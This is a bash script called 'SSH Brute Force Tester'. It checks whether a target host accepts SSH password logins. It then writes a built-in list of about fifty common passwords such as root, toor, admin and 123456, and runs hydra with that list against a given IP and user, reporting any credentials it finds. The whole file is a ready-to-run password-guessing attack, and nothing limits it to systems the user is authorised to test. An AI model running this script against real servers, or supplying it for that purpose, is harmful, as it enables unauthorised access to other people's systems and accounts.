#!/bin/bash
# SSH Brute Force Tester
# Usage: ./ssh-brute.sh <ip> <user> [wordlist]
# ./ssh-brute.sh 192.168.1.1 root
# ./ssh-brute.sh 192.168.1.1 admin /path/to/wordlist.txt

set -e

IP="${1:?Usage: $0 <ip> <user> [wordlist]}"
USER="${2:?Usage: $0 <ip> <user> [wordlist]}"
WORDLIST="${3:-/tmp/sshpw.txt}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}=== SSH Brute Force Tester ===${NC}"
echo -e "Target: ${RED}$IP${NC}"
echo -e "User:   ${RED}$USER${NC}"
echo ""

# Check if password auth is supported
echo -e "${YELLOW}[1/3] Checking password auth...${NC}"
if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -o PreferredAuthentications=none "$USER@$IP" 2>&1 | grep -q "publickey"; then
    echo -e "${RED}[!] Target does NOT support password authentication${NC}"
    echo -e "${RED}[!] Brute force impossible - server only accepts SSH keys${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Password auth supported!${NC}"

# Generate wordlist if not exists
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[2/3] Generating default wordlist...${NC}"
    cat > "$WORDLIST" << 'EOF'
root
toor
admin
password
123456
12345678
qwerty
abc123
password1
letmein
welcome
monkey
master
dragon
login
princess
football
shadow
sunshine
trustno1
batman
access
hello
charlie
123456789
1234567890
000000
111111
1234
12345
123123
666666
1q2w3e4r
qwerty123
1qaz2wsx
admin123
root123
passw0rd
p@ssword
p@ssw0rd
changeme
default
test
guest
ubuntu
debian
centos
server
linux
vps
EOF
else
    echo -e "${GREEN}[2/3] Using wordlist: $WORDLIST${NC}"
fi

COUNT=$(wc -l < "$WORDLIST")
echo -e "${YELLOW}[3/3] Starting brute force ($COUNT passwords)...${NC}"
echo ""

# Run hydra
hydra -l "$USER" -P "$WORDLIST" -t 4 -f -V "$IP" ssh 2>&1 | while IFS= read -r line; do
    if echo "$line" | grep -q "host:"; then
        echo -e "${GREEN}[FOUND] $line${NC}"
    elif echo "$line" | grep -q "login:"; then
        echo -e "${GREEN}[+] $line${NC}"
    elif echo "$line" | grep -q "\[ATTEMPT\]"; then
        echo -ne "${YELLOW}[*] Trying: $(echo "$line" | grep -oP 'login: \K.*')\r${NC}"
    fi
done

echo ""
echo -e "${YELLOW}=== Scan Complete ===${NC}"
